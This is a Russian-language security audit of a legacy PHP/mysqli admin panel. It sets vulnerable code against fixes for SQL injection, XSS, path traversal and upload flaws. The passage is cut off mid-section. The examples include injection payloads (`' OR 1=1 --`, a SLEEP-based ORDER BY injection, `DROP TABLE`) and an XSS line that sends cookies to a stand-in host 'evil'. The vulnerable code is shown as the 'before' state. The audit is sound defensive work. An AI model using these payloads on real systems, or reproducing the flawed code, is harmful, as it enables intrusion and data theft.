## Оглавление

- [0. Принципы исправления](#0-принципы-исправления)
- [1. Сводная таблица](#1-сводная-таблица)
- [2. Новые хелперы](#2-новые-хелперы)
- [3. Подробные исправления](#3-подробные-исправления)
- [4. Проход по файлам](#4-проход-по-файлам)
- [5. Найдено вне рамок этапа 1 (правки **не** вносились)](#5-найдено-вне-рамок-этапа-1-правки-не-вносились)
- [6. Допущения и что проверить после внедрения](#6-допущения-и-что-проверить-после-внедрения)

---

# Аудит безопасности legacy-админки (PHP / mysqli) - Этап 1

**Область этапа 1:** (1) все места, где `$_GET` / `$_POST` / `$_REQUEST` / `$_FILES` / `$_SERVER` / `$_SESSION` попадают в SQL и в другие места (JS, HTML, пути файлов, `include`) без проверки; (2) полная защита от SQL-инъекций на `mysqli`.
**Без сильного рефакторинга:** структура файлов, классы и сигнатуры сохранены. Добавлены только хелперы в `php/functions.php` и несколько приватных методов в `ObjectTable`.

Проверено файл за файлом: 17 файлов (раздел 4). Остальные найденные проблемы, не относящиеся к этапу 1, вынесены в раздел 5 **без правок**.

## 0. Принципы исправления

[🔝 Наверх](#оглавление)

| Проблема | Решение |
|---|---|
| Значения (логин, поля формы, id, фильтры) склеиваются в SQL | Подготовленные запросы: `db_prepared($sql, [$params])` (`mysqli::prepare` + `bind_param`) |
| Имена таблиц/колонок, `ORDER BY` нельзя передать плейсхолдером | Белый список (`ObjectTable::TABLES`, колонки из `colArray`) + `db_ident()` (`^[A-Za-z0-9_]{1,64}$` и обратные кавычки) |
| Числа из `$_SESSION`/`$_GET` идут в SQL и JS | Приведение к `int` / `filter_var(FILTER_VALIDATE_INT)` |
| Значения из сессии/БД вставляются в JS внутри `<script>` | `js_str()` (`json_encode` с `JSON_HEX_TAG\|AMP\|APOS\|QUOT`) |
| Значения вставляются в HTML | `html_esc()` / `htmlspecialchars` |
| Данные пользователя в пути файла / `include` | Белые списки, regex, `ctype_digit` |

---

## 1. Сводная таблица

[🔝 Наверх](#оглавление)

Severity: **Critical** - удалённое выполнение/полный обход защиты/чтение-запись БД; **High** - серьёзное, эксплуатируется легко; **Medium** - ограниченный эффект или нужны условия; **Low** - укрепление.

### 1.1 SQL-инъекции

[🔝 Наверх](#оглавление)

| ID | Файл / место | Sev. | Оригинал (кратко) | Исправление (кратко) | Что решает |
|---|---|---|---|---|---|
| S-01 | `functions.admin.php` `user_auth()` | Critical | `NL_USER_LOGIN = '" . $login . "'` | `NL_USER_LOGIN = ?`, `aes_encrypt(?, ?)`, `db_prepared()` | Обход входа (`' OR 1=1 --`), выгрузка данных через UNION |
| S-02 | `ObjectTable::__construct`, `jqgrid.show/edit/table.php` | Critical | `$tblName = $_GET["tblName"]` -> `FROM " . $this->dbName` | `ObjectTable::TABLES` + `isAllowedTable()`, `db_ident()` | Чтение/запись произвольной таблицы, SQLi в имени таблицы |
| S-03 | `showData()` фильтры | Critical | `"$search_field = $value"`, `LIKE '%" . $value . "%'`, имя поля из ключа `$_GET` | `buildSearchWhere()`: поле из белого списка колонок, значение через `?` | SQLi через значения и имена полей фильтра |
| S-04 | `getData()` `ORDER BY` | Critical | `" ORDER BY " . $sidx . " " . $sord` | `getSafeOrderBy()`: колонка из белого списка, `ASC/DESC` | SQLi в `ORDER BY` (subquery, time-based) |
| S-05 | `showData()/getData()` `LIMIT` | High | `"LIMIT " . $limit * ($page - 1) . ", " . $limit` | `(int)`, границы 1..1000, `LIMIT ?, ?` | SQLi/DoS через `page`, `rows` |
| S-06 | `saveData()` выбор/UPDATE/DELETE по `$id` | Critical | `"... WHERE ID_" . $this->dbName . " = " . $id` | `FILTER_VALIDATE_INT` + `= ?` | SQLi (даже без кавычек), массовое удаление/правка |
| S-07 | `saveData()` значения полей в INSERT/UPDATE | Critical | `"'" . $post[...] . "'"`, `array_push($values, $post[...])` для чисел, `AES_ENCRYPT('...','" . AESKEY . "')` | `prepareValue()` (проверка типа) + `?` / `AES_ENCRYPT(?, ?)` | SQLi через любое поле формы, включая числовые (без кавычек) |
| S-08 | `saveData()` `$oper` в лог | Critical | `VALUES(..., '" . $oper . "', ...)` | `in_array($oper, ["add","edit","del"], true)` + `?` | SQLi через `oper`, выполнение пустого/произвольного запроса |
| S-09 | `saveData()` лог изменений (`NL_LOG_DETAIL`) | High | `"'" . $row_cur[...] . "'"`, `"'" . $post[...] . "'"` | `VALUES (?, ?, ?, ?)` | SQLi 2-го порядка (payload из БД срабатывает в логе) |
| S-10 | `saveData()` IP из заголовков | Medium | `'" . $user_ip . "'` (`X-Forwarded-For`, `Client-IP`...) | `FILTER_VALIDATE_IP` + `?`; `split()` -> `explode()` | SQLi через заголовок; фатальная ошибка `split()` в PHP 7+ |
| S-11 | `getTableWhere()` (сессия в SQL) | Medium | `"(2 = " . $_SESSION["ID_NL_USER_PERMISSION"] . ")"` | `(int)($_SESSION[...] ?? 0)` | SQLi 2-го порядка через значения сессии |
| S-12 | `set_id.php` | Critical | `TABLE_NAME = '" . $tbl . "'`, `ALTER TABLE " . $tbl` | `ObjectTable::isAllowedTable()`, `?`, `db_ident()`, `$_POST` вместо `$_REQUEST` | SQLi и инъекция в DDL (`ALTER`) |
| S-13 | `select.get.php` | Critical | `"SELECT * FROM " . $tblChild . " WHERE ID_" . $tblParent . " = " . $idParent` | белый список таблиц, `db_ident()`, `FILTER_VALIDATE_INT`, `= ?` | SQLi + чтение любой таблицы |
| S-14 | `getData()` `AES_DECRYPT`, `get_query_left_joins()`, выбор справочников | Low | `AES_DECRYPT(" . $col->dbName . ",'" . AESKEY . "')`, `" LEFT JOIN " . $lj` | ``AES_DECRYPT(tbl.`col`, ?)``, `db_ident()` | Укрепление: ключ не в тексте SQL, идентификаторы проверяются |
| S-15 | `db_error()` и `echo $query;` | High | `return "...Ошибка в запросе:<br />" . $query`, `echo $query;` | generic-сообщение + `error_log`; `echo` удалён | Раскрытие структуры БД и отражённый XSS через текст запроса |

### 1.2 Данные из запроса/сессии в другие места

[🔝 Наверх](#оглавление)

| ID | Файл / место | Sev. | Оригинал (кратко) | Исправление (кратко) | Что решает |
|---|---|---|---|---|---|
| I-01 | `functions.admin.php` верх, `includeAdminPartsByLvl()` | High | `$page` из `REQUEST_URI` -> `include ".../parts/" . $page . ".php"` | `preg_match('/^[A-Za-z0-9_-]+$/')` | Path traversal / LFI в `include` |
| I-02 | `index.php` | Medium | `<?= $page ?>` в `class="..."` | `html_esc($page)` + валидация `$page` | Отражённый XSS через URL |
| I-03 | `parts/main.php` | Medium | `<?= $_SESSION["NL_USER_SHORT"] ?>` | `htmlspecialchars(...)` | Сохранённый XSS через имя пользователя |
| I-04 | `getjqGridCustom()` | High | `!= "' . $_SESSION["NL_USER_SHORT"] . '"` в `<script>` | `js_str($_SESSION["NL_USER_SHORT"] ?? "")` | Внедрение JS / XSS (имя редактируется любым сотрудником) |
| I-05 | `renderTable()` `defaultValue` | High | `'defaultValue : "' . $col->defValue . '"'` (телефон из сессии) | `js_str($col->defValue)` | Внедрение JS через телефон |
| I-06 | `getMainTableCol()`, `renderTable()` | Low | `defValue = $_SESSION["ID_NL_USER"]`, `== ' . $_SESSION["ID_NL_USER"] . ')` в JS | `(int)(...)` | Нечисловое значение сессии в JS |
| I-07 | `renderTable()` значения `select` | High | `mb_ereg_replace('"', '\\"', $row[...])` (экранируется только `"`) | `js_str($selectOptions)` | Внедрение JS через элемент справочника (`\`, `</script>`) |
| I-08 | `onlymy.php` | Low | `$_SESSION["onlymy"] = $_POST["onlymy"];` | только `"1"` / `"0"` | Произвольные данные в сессии |
| I-09 | `file.upload.php` путь | Critical | `$tbl/$col/$id = $_REQUEST[...]` -> `"/img/" . $dir . "/" . $col . "_" . $id`; `mb_ereg_replace($tbl . "_", ...)` | белый список таблицы и колонки, `ctype_digit($id)` | Path traversal (запись файла вне `/img`), regex-инъекция |
| I-10 | `file.upload.php` расширение | High | чёрный список `.php .phtml .php3 .php4 .php5` | белый список `jpg/jpeg/png/gif/webp` + `getimagesize` | Загрузка `.phar/.php7/.pht/.phps` и т.п. -> RCE |
| I-11 | `saveData()` очистка фото | High | `glob(... $trueId ...)` где `$trueId = $values[0]` из `$_POST`, затем `unlink` | `$trueId` = валидированное целое | Удаление чужих `.jpg` (`*`, `../`) |
| I-12 | `showData()` XML | Medium | `"<page>" . $page`, `<row id="` . $data[$i][0], `CDATA[` . $data . `]]>` | `(int)`, `htmlspecialchars(ENT_XML1)`, разрыв `]]>` | Инъекция в XML-ответ |
| I-13 | `select.get.php` вывод | Medium | `'<option value="' . $row[...] . '">' . $row[...]` | `html_esc()` | Сохранённый XSS через справочники |
| I-14 | `renderTable()` шаблон | Low | `mb_ereg_replace("{colModel}", $colModel, ...)` | `str_replace(...)` | Regex/`\0` обратные ссылки в подстановке данных |
| I-15 | `db_connect()` | Low | `printf("Ошибка подключения к базе: %s", $mysqli->connect_error)` | `error_log` + generic | Раскрытие хоста/пользователя БД |

---

## 2. Новые хелперы

[🔝 Наверх](#оглавление)

```php
// Подготовленный запрос: данные ТОЛЬКО через $params (`php/functions.php`)
function db_prepared($query, array $params = array()) {
    global $mysqli;
    try {
        $stmt = $mysqli->prepare($query);
        if ($stmt === false) { error_log("DB prepare error: " . $mysqli->error . " | " . $query); return false; }
        if (count($params) > 0) {
            $types = ""; $values = array();
            foreach (array_values($params) as $p) {
                if (is_bool($p)) { $p = (int)$p; }
                if (is_int($p))        { $types .= "i"; }
                elseif (is_float($p))  { $types .= "d"; }
                else { $types .= "s"; $p = ($p === null) ? null : (string)$p; }
                $values[] = $p;
            }
            $stmt->bind_param($types, ...$values);
        }
        if (!$stmt->execute()) { error_log("DB execute error: " . $stmt->error . " | " . $query); $stmt->close(); return false; }
        $result = $stmt->get_result();          // false для INSERT/UPDATE/DELETE
        $stmt->close();
        return ($result === false) ? true : $result;
    } catch (mysqli_sql_exception $e) { error_log("DB prepared error: " . $e->getMessage() . " | " . $query); return false; }
}

// Идентификаторы (имена таблиц/колонок) плейсхолдером не передать
function db_ident($name) {
    if (!is_string($name) || !preg_match('/^[A-Za-z0-9_]{1,64}$/', $name)) {
        error_log("DB bad identifier"); http_response_code(400); exit("Bad request");
    }
    return "`" . $name . "`";
}

function db_like($value) { return "%" . addcslashes((string)$value, "\\%_") . "%"; }
function html_esc($value) { return htmlspecialchars((string)$value, ENT_QUOTES | ENT_SUBSTITUTE, "UTF-8"); }
function js_str($value) {
    $json = json_encode((string)$value, JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT | JSON_UNESCAPED_UNICODE | JSON_INVALID_UTF8_SUBSTITUTE);
    return ($json === false) ? '""' : $json;
}
```

`db_query()` оставлен только для запросов без переменных; в него добавлен перехват `mysqli_sql_exception` (в PHP 8.1+ mysqli по умолчанию бросает исключения, и шаблон `db_query(...) or die(...)` перестаёт работать).

---

## 3. Подробные исправления

[🔝 Наверх](#оглавление)

### S-01 - `user_auth()` (`functions.admin.php`), Critical

[🔝 Наверх](#оглавление)
**Причина:** логин и пароль из `$_POST` конкатенируются в SQL. `admin' -- ` в логине полностью отключает проверку пароля. Также в функцию может прийти не строка (`login[]=...`).

**Было:**
```php
$query = "SELECT * FROM NL_USER au WHERE ((au.NL_USER_LOGIN = '" . $login . "') AND au.NL_USER_PASSWORD = aes_encrypt('" . $pass . "','" . AESKEY . "'))";
$res = db_query($query) or die(db_error($query));
if (db_num_rows($res) > 0) {
    $row = db_fetch_assoc($res);
    $_SESSION["ID_NL_USER"] = $row["ID_NL_USER"];
    ...
    $_SESSION["ID_NL_USER_PERMISSION"] = $row["ID_NL_USER_PERMISSION"];
```
**Стало:**
```php
if (!is_string($login) || !is_string($pass) || ($login === "") || (strlen($login) > 50) || (strlen($pass) > 255)) {
    return false;
}
$query = "SELECT * FROM NL_USER au WHERE ((au.NL_USER_LOGIN = ?) AND au.NL_USER_PASSWORD = aes_encrypt(?, ?))";
$res = db_prepared($query, array($login, $pass, AESKEY)) or die(db_error($query));
if (db_num_rows($res) > 0) {
    $row = db_fetch_assoc($res);
    session_regenerate_id(true);                       // защита от фиксации сессии
    $_SESSION["ID_NL_USER"] = (int)$row["ID_NL_USER"]; // числа из сессии дальше идут в SQL и JS
    ...
    $_SESSION["ID_NL_USER_PERMISSION"] = (int)$row["ID_NL_USER_PERMISSION"];
```
**Решает:** обход авторизации и SQLi на входе; типизация данных сессии (закрывает S-11 для источника); `session_regenerate_id` - бонус к этапу 2.

---

### S-02 - имя таблицы из `$_GET["tblName"]`, Critical

[🔝 Наверх](#оглавление)
**Причина:** `jqgrid.show.php`, `jqgrid.edit.php`, `jqgrid.table.php` создают `new ObjectTable($_GET["tblName"])`; имя идёт в `FROM`, `UPDATE`, `DELETE`, `INSERT`, `glob`, а также в JS/HTML шаблона (`{tableName}`). Плейсхолдером имя таблицы не передать, значит нужен белый список.

**Было:**
```php
// jqgrid.show.php (аналогично edit / table)
$tblName = $_GET["tblName"];
$table = new ObjectTable($tblName);

// ObjectTable
function __construct($tableName) {
    $this->dbName = $tableName;
```
**Стало:**
```php
// jqgrid.show.php
$tblName = $_GET["tblName"] ?? "";
$table = new ObjectTable($tblName); // проверка по белому списку в конструкторе

// ObjectTable
const TABLES = ["NL_VIEW", "NL_HOUSES", "NL_MATERIAL", "NL_USER", "NL_PROP_RESALE"];
public static function isAllowedTable($tableName) {
    return is_string($tableName) && in_array($tableName, self::TABLES, true);
}
function __construct($tableName) {
    if (!self::isAllowedTable($tableName)) { http_response_code(400); exit("Bad request"); }
    $this->dbName = $tableName;
```
**Решает:** SQLi, XSS/JS-инъекцию через `{tableName}`, чтение и запись в произвольные таблицы (`NL_LOG`, служебные). Проверка в конструкторе закрывает сразу все три endpoint-а и будущие вызовы. Список совпадает с таблицами, описанными в `getTableColArray()`.

---

### S-03 - фильтры поиска в `showData()`, Critical

[🔝 Наверх](#оглавление)
**Причина:** каждый параметр `$_GET`, в имени которого есть `NL_`, превращается в условие: и **имя поля**, и **значение** подставляются в SQL. Для числовых колонок значение идёт вообще без кавычек: `NL_PROP_RESALE_FLOOR=1 OR 1=1`, `..._COST_TOTAL_from=0 UNION SELECT ...`.

**Было:**
```php
foreach ($_GET as $key => $value) {
    if (strpos($key, "NL_") !== false) {
        $search_field = $key;
        if (strpos($key, "ID_") === 0) { $search_field = substr($key, 3) . "_SHORT"; }
        if (strpos($key, "_from") !== false) {
            $search_field = str_replace("_from", "", $search_field);
            $search_value = "$search_field >= " . $value;
        } elseif (strpos($key, "_to") !== false) {
            $search_value = "$search_field <= " . $value;
        } else {
            $search_value = "$search_field = $value";
            ...LIKE '%" . $value . "%'
        }
        $search_where .= " AND ($search_value)";
```
**Стало:**
```php
list($search_where, $search_params) = $this->buildSearchWhere($_GET);
...
private function buildSearchWhere($source) {
    $where = "(1=1)"; $params = Array();
    $columns = Array();                                    // только колонки таблицы, кроме пароля
    foreach ($this->getOwnColumns() as $col) {
        if ($col->type != "encrypted") { $columns[$col->dbName] = $col; }
    }
    foreach ($source as $key => $value) {
        if (!is_string($key) || !is_string($value) || ($value === "") || (strpos($key, "NL_") === false)) continue;
        $operator = "="; $baseKey = $key;
        if (preg_match('/^(.+)_(from|to)$/', $key, $m)) { $baseKey = $m[1]; $operator = ($m[2] == "from") ? ">=" : "<="; }
        if (!isset($columns[$baseKey])) continue;          // неизвестные параметры игнорируются
        $col = $columns[$baseKey];
        $field = ($col->type == "select") ? db_ident(substr($col->dbName, 3) . "_SHORT") : "tbl." . db_ident($col->dbName);
        if (($col->type == "integer") || ($col->type == "float")) {
            if (!is_numeric($value)) { $where .= " AND (1=0)"; continue; }
            $params[] = trim($value);                      $where .= " AND ($field $operator ?)";
        } elseif ($operator == "=") {
            $params[] = db_like($value);                   $where .= " AND ($field LIKE ?)";
        } else {
            $params[] = $value;                            $where .= " AND ($field $operator ?)";
        }
    }
    return array($where, $params);
}
```
**Решает:** SQLi через значения (включая числовые) и через **имена** полей. Дополнительно `%` и `_` в `LIKE` экранируются, а колонка пароля недоступна для поиска (иначе по ней можно делать оракул). `COUNT(*)` теперь учитывает `$this->where` (ограничения доступа), как и выборка.

---

### S-04 - `ORDER BY` (`sidx`, `sord`), Critical

[🔝 Наверх](#оглавление)
**Причина:** `$_GET['sidx']` и `$_GET['sord']` конкатенируются в `ORDER BY`; там работают подзапросы и time-based инъекции (`sidx=(SELECT IF(...,SLEEP(5),1))`). Значения нельзя передать плейсхолдером.

**Было:**
```php
$sidx = $_GET['sidx'];
$sord = isset($_GET['sord']) ? $_GET['sord'] : "ASC";
...
$query .= " ORDER BY " . $sidx . " " . $sord;
```
**Стало:**
```php
$sidx = is_string($_GET['sidx'] ?? null) ? $_GET['sidx'] : "";
$sord = is_string($_GET['sord'] ?? null) ? $_GET['sord'] : "ASC";
...
$query .= " ORDER BY " . $this->getSafeOrderBy($sidx, $sord);

private function getSafeOrderBy($sidx, $sord) {
    $column = "ID_" . $this->dbName;                        // по умолчанию
    if (is_string($sidx)) {
        foreach ($this->getOwnColumns() as $col) {
            if (($col->dbName === $sidx) && ($col->type != "encrypted")) { $column = $col->dbName; break; }
        }
    }
    $direction = (strtoupper((string)$sord) === "DESC") ? "DESC" : "ASC";
    return "tbl." . db_ident($column) . " " . $direction;
}
```
**Решает:** SQLi в `ORDER BY`. Побочный эффект: префикс `tbl.` устраняет ошибку «Column ... is ambiguous» при сортировке по колонкам-справочникам с `JOIN`; пустой `sidx` больше не ломает запрос.

---

### S-05 - `LIMIT` (`page`, `rows`), High

[🔝 Наверх](#оглавление)
**Причина:** `$_GET['page']` и `$_GET['rows']` идут в `LIMIT` и в XML как есть. `rows=1000000` - DoS, а `page`/`rows` - вектор инъекции.

**Было:**
```php
$page = $_GET['page'];   $limit = $_GET['rows'];
...
$query .= " LIMIT " . $limit * ($page - 1) . ", " . $limit;
```
**Стало:**
```php
$page = (int)($_GET['page'] ?? 1);   if ($page < 1) { $page = 1; }
$limit = (int)($_GET['rows'] ?? 50); if ($limit < 1) { $limit = 50; } if ($limit > 1000) { $limit = 1000; }
...
$query .= " LIMIT ?, ?";
$params[] = max(0, (int)$limit * ((int)$page - 1));
$params[] = max(0, (int)$limit);
```
**Решает:** инъекцию и DoS. Максимум 1000 соответствует `rowList` в `jqgrid.html`.

---

### S-06 / S-07 / S-08 / S-09 - `saveData()`, Critical

[🔝 Наверх](#оглавление)
**Причина:** метод вызывается из `jqgrid.edit.php` со всем `$_POST`. Из него в SQL склеиваются `$id`, `$oper`, значения полей (числовые без кавычек), старые значения из БД для лога, ключ AES.

**Было (ключевые места):**
```php
$query_cur = "SELECT * FROM " . $this->dbName . " WHERE ID_" . $this->dbName . " = " . $id;
...
$query_log = "INSERT INTO NL_LOG(...) VALUES('" . date("Y.m.d") . "', '" . date("H:i:s") . "', '" . $user_ip . "', '" . $oper . "', '" . $this->dbName . "', " . $_SESSION["ID_NL_USER"] . " )";
...
array_push($values, "'" . $post[$col->dbName] . "'");                         // строки
array_push($values, "AES_ENCRYPT('" . $post[$col->dbName] . "','" . AESKEY . "')");
array_push($values, $post[$col->dbName]);                                     // числа - без кавычек!
...
$valold = "'" . $row_cur[$col->dbName] . "'";   $valnew = "'" . $post[$col->dbName] . "'";
$query_log_detail = "INSERT INTO NL_LOG_DETAIL(...) VALUES (" . $row_log["ID_LOG"] . ", " . $valold . "," . $valnew . ", '" . $col->dbName . "')";
...
$query = "UPDATE " . $this->dbName . " SET " . ... . $fields[$i] . " = " . $values[$i] ... " WHERE ID_" . $this->dbName . " = " . $id;
echo $query;
```
**Стало:**
```php
// 1) операция и id - до любых запросов
if (!in_array($oper, array("add", "edit", "del"), true) || !is_array($post)) { http_response_code(400); die(); }
$id = filter_var($id, FILTER_VALIDATE_INT, array("options" => array("min_range" => 1)));
if (($id === false) && ($oper != "add")) { http_response_code(400); die(); }

// 2) выбор текущей записи
$query_cur = "SELECT * FROM " . db_ident($this->dbName) . " WHERE " . db_ident("ID_" . $this->dbName) . " = ?";
$res_cur = db_prepared($query_cur, array($id)) or die(db_error($query_cur));

// 3) проверка и подготовка значений ДО записи в лог
$p = $this->prepareValue($col, $raw);       // false -> HTTP 400
private function prepareValue($col, $raw) {
    if (($raw === null) || (trim($raw) === "")) { return array("?", array(null)); }
    switch ($col->type) {
        case "integer": case "select":
            if (!preg_match('/^\s*-?\d{1,18}\s*$/', $raw)) { return false; }
            return array("?", array((int)$raw));
        case "float":
            if (!is_numeric($raw)) { return false; }
            return array("?", array(trim($raw)));
        case "encrypted": return array("AES_ENCRYPT(?, ?)", array($raw, AESKEY));
        default:          return array("?", array($raw));
    }
}

// 4) лог
$query_log = "INSERT INTO NL_LOG(NL_LOG_DATE, NL_LOG_TIME, NL_LOG_IP, NL_LOG_IUD, NL_LOG_TABLE_NAME, ID_NL_USER) VALUES(?, ?, ?, ?, ?, ?)";
db_prepared($query_log, array(date("Y.m.d"), date("H:i:s"), $user_ip, $oper, $this->dbName, (int)($_SESSION["ID_NL_USER"] ?? 0))) or die(db_error($query_log));
$query_log_detail = "INSERT INTO NL_LOG_DETAIL(ID_NL_LOG, NL_LOG_DETAIL_OLD, NL_LOG_DETAIL_NEW, NL_LOG_DETAIL_FIELD) VALUES (?, ?, ?, ?)";
db_prepared($query_log_detail, array((int)$row_log["ID_LOG"], $valold, $valnew, $col->dbName)) or die(db_error($query_log_detail));

// 5) итоговый запрос
$query = "INSERT INTO " . $tbl . " (" . implode(",", array_map("db_ident", $fields)) . ") VALUES(" . implode(",", $placeholders) . ")";
$query = "UPDATE " . $tbl . " SET " . implode(",", $set) . " WHERE " . $tblId . " = ?";   // $set[] = `col` = ? / AES_ENCRYPT(?, ?)
$query = "DELETE FROM " . $tbl . " WHERE " . $tblId . " = ?";
db_prepared($query, $query_params) or die(db_error($query));       // echo $query; удалён
```
**Решает:**
- S-06: `id` - только положительное целое и плейсхолдер.
- S-07: любые значения полей попадают в SQL только через плейсхолдеры; числовые колонки проверяются по типу (раньше `ID_NL_VIEW=1 OR 1=1` попадало в `VALUES`/`SET` без кавычек). Невалидное значение даёт HTTP 400 до записи в лог.
- S-08: `oper` из белого списка; раньше неизвестное значение превращалось в пустой запрос `""`.
- S-09: старые значения из БД больше не склеиваются в лог, что закрывает SQLi 2-го порядка (payload, сохранённый ранее, срабатывал при следующем редактировании).
- S-15: клиенту больше не возвращается текст запроса.

### S-10 - IP пользователя, Medium

[🔝 Наверх](#оглавление)
**Причина:** при отсутствии `REMOTE_ADDR` IP берётся из заголовков `HTTP_X_FORWARDED_FOR`, `HTTP_CLIENT_IP`, `HTTP_VIA` и др. (их задаёт клиент) и склеивается в SQL. Ветка `15 < strlen` вызывает `split()`, удалённую в PHP 7 (фатальная ошибка).

**Было:**
```php
$ar = split(', ', $user_ip);
...
VALUES(... '" . $user_ip . "' ...
```
**Стало:**
```php
$ar = explode(', ', $user_ip);
...
if (filter_var($user_ip, FILTER_VALIDATE_IP) === false) { $user_ip = 'unknown'; }   // + значение идёт через ?
```
**Решает:** инъекцию через заголовок и падение на длинных значениях.

### S-11 - `$_SESSION` в `WHERE` (`getTableWhere`), Medium

[🔝 Наверх](#оглавление)
**Причина:** значения из сессии (взятые из БД) подставлялись в SQL как есть. Любая строка, попавшая в сессию, - SQLi 2-го порядка.

**Было:**
```php
return "(tbl.ID_NL_USER_PERMISSION != 2) AND (2 = " . $_SESSION["ID_NL_USER_PERMISSION"] . ")";
return "(tbl.ID_NL_USER = " . $_SESSION["ID_NL_USER"] . ")";
```
**Стало:**
```php
return "(tbl.ID_NL_USER_PERMISSION != 2) AND (2 = " . (int)($_SESSION["ID_NL_USER_PERMISSION"] ?? 0) . ")";
return "(tbl.ID_NL_USER = " . (int)($_SESSION["ID_NL_USER"] ?? 0) . ")";
```
**Решает:** в условие попадает только число. Условия без пользовательских строк оставлены литералами (int-cast достаточен), чтобы не менять структуру `$this->where`.

### S-12 - `set_id.php`, Critical

[🔝 Наверх](#оглавление)
**Причина:** `$_REQUEST["table"]` (включает GET/POST/COOKIE) подставляется в запрос к `INFORMATION_SCHEMA` **и в DDL** `ALTER TABLE`; DDL нельзя параметризовать, поэтому допустимо только имя из белого списка.

**Было:**
```php
$tbl = $_REQUEST["table"];
$query = "SELECT AUTO_INCREMENT FROM INFORMATION_SCHEMA.TABLES WHERE (TABLE_SCHEMA = '" . DBNAME . "') AND (TABLE_NAME = '" . $tbl . "')";
$query = "ALTER TABLE " . $tbl . " AUTO_INCREMENT = " . ($id + 1);
```
**Стало:**
```php
$tbl = $_POST["table"] ?? "";
if (!ObjectTable::isAllowedTable($tbl)) { http_response_code(400); db_disconnect(); exit("Bad request"); }
$query = "SELECT AUTO_INCREMENT FROM INFORMATION_SCHEMA.TABLES WHERE (TABLE_SCHEMA = ?) AND (TABLE_NAME = ?)";
$res = db_prepared($query, array(DBNAME, $tbl));
$id = (int)($row["AUTO_INCREMENT"] ?? 0);
$query = "ALTER TABLE " . db_ident($tbl) . " AUTO_INCREMENT = " . ($id + 1);
```
**Решает:** SQLi и инъекцию в DDL (`x; DROP TABLE ...`, `ALTER` произвольной таблицы). JS (`defValue` в `getMainTableCol`) шлёт именно POST.

### S-13 - `select.get.php`, Critical

[🔝 Наверх](#оглавление)
**Причина:** три параметра `$_POST` собираются в запрос, плюс значения БД печатаются в HTML без экранирования. Функции `db_fetch_array` нет в приложенном `functions.php` (вызов падает), поэтому используется `db_fetch_assoc`.

**Было:**
```php
$query = "SELECT * FROM " . $tblChild . " WHERE ID_" . $tblParent . " = " . $idParent;
$res = db_query($query);
while ($row = db_fetch_array($res)) {
    $options .= '<option value="' . $row["ID_" . $tblChild] . '">' . $row[$tblChild . "_SHORT"] . '</option>';
```
**Стало:**
```php
$idParent = filter_var($_POST["idParent"] ?? null, FILTER_VALIDATE_INT);
$lookupTables = array_merge(ObjectTable::TABLES, array("NL_USER_PERMISSION"));
if (!in_array($tblParent, $lookupTables, true) || !in_array($tblChild, $lookupTables, true) || ($idParent === false)) { http_response_code(400); db_disconnect(); exit("Bad request"); }
$query = "SELECT * FROM " . db_ident($tblChild) . " WHERE " . db_ident("ID_" . $tblParent) . " = ?";
$res = db_prepared($query, array($idParent));
...
$options .= '<option value="' . html_esc($row["ID_" . $tblChild] ?? "") . '">' . html_esc($row[$tblChild . "_SHORT"] ?? "") . '</option>';
```
**Решает:** SQLi, чтение произвольной таблицы, XSS в `<option>`.

### S-14 - укрепление остальных идентификаторов, Low

[🔝 Наверх](#оглавление)
Имена, формируемые из кода (`AES_DECRYPT(col)`, `LEFT JOIN`, таблица справочника в `renderTable()`), не приходят от пользователя, но теперь тоже проходят через `db_ident()`, а ключ AES передаётся как параметр.

**Было:**
```php
$query .= ", AES_DECRYPT(" . $col->dbName . ",'" . AESKEY . "') AS " . $col->dbName . "_DECRYPTED";
$leftJoin .= " LEFT JOIN " . $lj . " ON " . $lj . ".ID_" . $lj . " = tbl.ID_" . $lj;
$query = "SELECT * FROM " . $selectTableName;
```
**Стало:**
```php
$query .= ", AES_DECRYPT(tbl." . db_ident($col->dbName) . ", ?) AS " . db_ident($col->dbName . "_DECRYPTED");   // $params[] = AESKEY
$leftJoin .= " LEFT JOIN " . db_ident($lj) . " ON " . db_ident($lj) . "." . db_ident("ID_" . $lj) . " = tbl." . db_ident("ID_" . $lj);
$query = "SELECT * FROM " . db_ident($selectTableName);
```
**Решает:** защита в глубину: случайное изменение таблиц/колонок не превратится в инъекцию.

### S-15 - `db_error()`, `echo $query`, Medium-High

[🔝 Наверх](#оглавление)
**Причина:** `die(db_error($query))` печатает в браузер **полный текст запроса** со значениями пользователя: раскрытие структуры БД и отражённый XSS (значение из формы попадает в HTML).

**Было:**
```php
function db_error($query) {
    $q_err = "<br /><br />Ошибка в запросе:<br />" . $query . "<br /><br />";
    return $q_err;
}
```
**Стало:**
```php
function db_error($query) {
    global $mysqli;
    error_log("DB error: " . ($mysqli ? $mysqli->error : "") . " | " . $query);
    return "<br /><br />Ошибка выполнения запроса.<br /><br />";
}
```
**Решает:** утечку структуры БД и XSS; подробности пишутся в `error_log`. Аналогично `db_connect()` (I-15) больше не печатает `connect_error`.

---

### I-01 / I-02 - `$page` из `REQUEST_URI`, High / Medium

[🔝 Наверх](#оглавление)
**Причина:** `$page` берётся из `REQUEST_URI` (сырой, не декодированный, без нормализации: `curl --path-as-is`), подставляется в `include` и в атрибуты `class`. Значения вроде `../../x` дают path traversal, а `"><script>` - XSS.

**Было:**
```php
$page = rtrim($page_array[1], "/");
...
$main_file = $_SERVER["DOCUMENT_ROOT"] . "/admin/parts/" . $page . ".php";
if (file_exists($main_file)) { include $main_file; }
...
<html lang="ru" class="html-<?= $page ?>">   <body class="admin admin-<?= $page ?>">
```
**Стало:**
```php
$page = rtrim($page_array[1] ?? "", "/");
if (!preg_match('/^[A-Za-z0-9_-]+$/', $page)) { $page = ""; }
...
if (preg_match('/^[A-Za-z0-9_-]+$/', $page) && file_exists($main_file)) { include $main_file; }   // повторная проверка в самой функции
...
<html lang="ru" class="html-<?= html_esc($page) ?>">   <body class="admin admin-<?= html_esc($page) ?>">
```
**Решает:** LFI/path traversal в `include` (вместе с `.php` на конце это включение любого `.php` на сервере) и отражённый XSS. Поведение страниц `login` / `main` не меняется.

### I-03..I-07 - сессия и данные БД в HTML/JS, High / Medium

[🔝 Наверх](#оглавление)
**Причина:** `NL_USER_SHORT` и `NL_USER_PHONE` вводятся в справочнике «Пользователи» (а с учётом N-01/N-02 их может изменить не только администратор), попадают в сессию и подставляются в HTML и в `<script>` без экранирования. Например, краткое имя `"; fetch('//evil/'+document.cookie);//` выполнится у каждого, чей интерфейс его выводит (в т.ч. у администратора). Так же значения справочников в `value : "..."`: экранировался только `"`, а `\`, `</script>` нет.

**Было:**
```php
// main.php
